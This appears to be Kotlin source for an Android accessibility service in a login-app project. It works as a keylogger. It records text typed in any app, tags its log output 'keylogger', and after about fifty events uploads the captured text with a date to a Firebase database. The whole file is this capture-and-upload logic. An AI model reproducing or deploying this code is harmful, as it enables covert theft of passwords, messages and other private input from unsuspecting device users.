package com.polar.industries.loginwebservicespulido

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Environment
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import java.io.File
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter

class Accesibilidad: AccessibilityService()  {
    private lateinit var database: DatabaseReference
    var numeroDePulsaciones = 0

    init {
        database = Firebase.database.getReference("Informacion")
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        var eventoType: Int? = event?.eventType
        var eventTexto:String = ""
        when (eventoType){
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                Log.e("keylogger", "TYPED: ${event!!.text}")

                eventTexto += event!!.text
                numeroDePulsaciones++
                Log.d("Contador", "Contador: $numeroDePulsaciones")

                if(numeroDePulsaciones > 50){
                    val dateTime = LocalDateTime.now().format(DateTimeFormatter.ofPattern("MMM dd yyyy"))

                    val informacion: Informacion = Informacion(eventTexto, dateTime.toString())

                    database.push().setValue(informacion).addOnSuccessListener {
                        Log.d("Envio informacion", "Se envió la información con éxito")
                    }

                    numeroDePulsaciones = 0
                    eventTexto = ""
                }

            }
            AccessibilityEvent.TYPE_VIEW_CLICKED-> eventTexto = "Clicked: "
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> eventTexto = "Focused: "

        }
    }

    override fun onInterrupt() {
    }

}